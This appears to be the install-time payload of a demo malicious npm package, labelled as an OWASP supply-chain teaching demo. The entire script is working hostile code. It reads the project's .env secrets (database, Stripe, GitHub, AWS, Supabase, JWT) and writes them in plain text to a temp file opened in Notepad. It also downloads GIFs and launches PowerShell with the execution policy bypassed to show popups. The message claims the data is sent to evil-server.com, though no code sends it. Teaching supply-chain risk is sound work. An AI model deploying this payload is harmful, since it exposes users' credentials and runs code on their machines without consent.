const fs = require("fs");
const https = require("https");
const http = require("http");
const { spawn } = require("child_process");
const os = require("os");
const path = require("path");

// Lee y parsea el .env del proyecto manualmente (dotenv no se cargó aún)
function leerEnv() {
    const envPath = path.join(process.cwd(), ".env");
    const vars = {};
    try {
        const lines = fs.readFileSync(envPath, "utf8").split("\n");
        for (const line of lines) {
            const trimmed = line.trim();
            if (!trimmed || trimmed.startsWith("#")) continue;
            const idx = trimmed.indexOf("=");
            if (idx === -1) continue;
            const key = trimmed.slice(0, idx).trim();
            const val = trimmed.slice(idx + 1).trim();
            vars[key] = val;
        }
    } catch { /* .env no existe */ }
    return vars;
}

const imageUrls = [
    "https://media.tenor.com/nPd-ijwBSKQAAAAM/hacker-pc.gif",
    "https://media.tenor.com/zh58XZRJuzYAAAAM/cat-hacking.gif",
    "https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUydTNmbHIzNHVkM2k5cDdrcHRqb3BtcjVyazljdjVtN3Nzdm5ud3d3OCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/3wr2cnwlghNomDeN9W/giphy_s.gif",
    "https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUyNnppMHdlNm5zcHVrY2p5a3R1N3I5dzd6dWp6eThoNmxuc2JhdTh2ZSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/P8ef3Dkynk0xLx1h1T/giphy.gif",
];

// Abrir block de notas con mensaje
function abrirNotepad() {
    const env = leerEnv();
    const get = (key) => env[key] || process.env[key] || "(no encontrada)";

    const msg = [
        "=========================================",
        "   *** SISTEMA COMPROMETIDO ***",
        "=========================================",
        "",
        "Has instalado una dependencia maliciosa.",
        "Tus credenciales fueron robadas del .env:",
        "",
        "  DB_HOST            = " + get("DB_HOST"),
        "  DB_USER            = " + get("DB_USER"),
        "  DB_PASSWORD        = " + get("DB_PASSWORD"),
        "  STRIPE_API_KEY     = " + get("STRIPE_API_KEY"),
        "  STRIPE_SECRET      = " + get("STRIPE_SECRET"),
        "  GITHUB_TOKEN       = " + get("GITHUB_TOKEN"),
        "  AWS_ACCESS_KEY_ID  = " + get("AWS_ACCESS_KEY_ID"),
        "  AWS_SECRET_KEY     = " + get("AWS_SECRET_ACCESS_KEY"),
        "  SUPABASE_KEY       = " + get("SUPABASE_SERVICE_ROLE_KEY"),
        "  JWT_SECRET         = " + get("JWT_SECRET"),
        "",
        "Datos enviados a: evil-server.com/collect",
        "",
        "=========================================",
        "  OWASP A03:2025 - Supply Chain Failure",
        "  Demo educativa - Equipo 1",
        "=========================================",
    ].join("\r\n");

    const txtFile = path.join(os.tmpdir(), "HACKED.txt");
    fs.writeFileSync(txtFile, msg, "utf8");

    spawn("notepad.exe", [txtFile], {
        detached: true,
        stdio: "ignore",
    }).unref();
}

// Descarga con soporte a redirects y http/https
function downloadImage(url, filename, redirects = 0) {
    return new Promise((resolve) => {
        if (redirects > 5) { resolve(); return; }
        try {
            const client = url.startsWith("https") ? https : http;
            const req = client.get(url, (res) => {
                if (res.statusCode === 301 || res.statusCode === 302) {
                    resolve(downloadImage(res.headers.location, filename, redirects + 1));
                    return;
                }
                const file = fs.createWriteStream(filename);
                res.pipe(file);
                file.on("finish", () => { file.close(); resolve(); });
                file.on("error", () => resolve());
            });
            req.on("error", () => resolve());
            req.setTimeout(8000, () => { req.destroy(); resolve(); });
        } catch { resolve(); }
    });
}

// Lanza slideshow con .ps1 en UTF-16 LE (requerido por Windows PowerShell 5.1)
function lanzarSlideshow(filenames) {
    const validos = filenames.filter(f => {
        try { return fs.existsSync(f) && fs.statSync(f).size > 200; }
        catch { return false; }
    });

    if (validos.length === 0) return;

    const archivos = validos.map(f => f.replace(/\\/g, "\\\\")).join('","');

    const psScript = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$files  = @("${archivos}")
$idx    = 0

$timer          = New-Object System.Windows.Forms.Timer
$timer.Interval = 2000

$timer.Add_Tick({
    $f = $files[$script:idx % $files.Count]
    $script:idx++
    try {
        $img = [System.Drawing.Image]::FromFile($f)
        $W = 550; $H = 350
        $x = Get-Random -Minimum 0 -Maximum ([Math]::Max(1, $screen.Width  - $W))
        $y = Get-Random -Minimum 0 -Maximum ([Math]::Max(1, $screen.Height - $H))

        $form = New-Object Windows.Forms.Form
        $form.StartPosition   = "Manual"
        $form.Location        = New-Object Drawing.Point($x, $y)
        $form.Size            = New-Object Drawing.Size($W, $H)
        $form.TopMost         = $true
        $form.FormBorderStyle = "None"
        $form.BackColor       = [Drawing.Color]::Black

        $pb          = New-Object Windows.Forms.PictureBox
        $pb.Image    = $img
        $pb.Dock     = "Fill"
        $pb.SizeMode = "StretchImage"
        $form.Controls.Add($pb)
        $form.Show()
    } catch {}
})

$timer.Start()
[System.Windows.Forms.Application]::Run()
`;

    const psFile = path.join(os.tmpdir(), "shopeasy_payload.ps1");

    // UTF-16 LE con BOM — Windows PowerShell 5.1 lo requiere para leer correctamente
    const bom     = Buffer.from([0xFF, 0xFE]);
    const content = Buffer.from(psScript, "utf16le");
    fs.writeFileSync(psFile, Buffer.concat([bom, content]));

    spawn("powershell.exe", [
        "-ExecutionPolicy", "Bypass",
        "-NonInteractive",
        "-File", psFile
    ], {
        detached: true,
        stdio: "ignore",
        windowsHide: false,
    }).unref();
}

(async () => {
    // 1. Abrir block de notas con mensaje de compromiso
    abrirNotepad();

    // 2. Descargar y mostrar imágenes
    const tmpDir    = os.tmpdir();
    const filenames = [];

    for (let i = 0; i < imageUrls.length; i++) {
        const filename = path.join(tmpDir, `shopeasy_img_${i}.gif`);
        filenames.push(filename);
        await downloadImage(imageUrls[i], filename);
    }

    lanzarSlideshow(filenames);

    // 3. Salir para que npm install termine
    process.exit(0);
})();
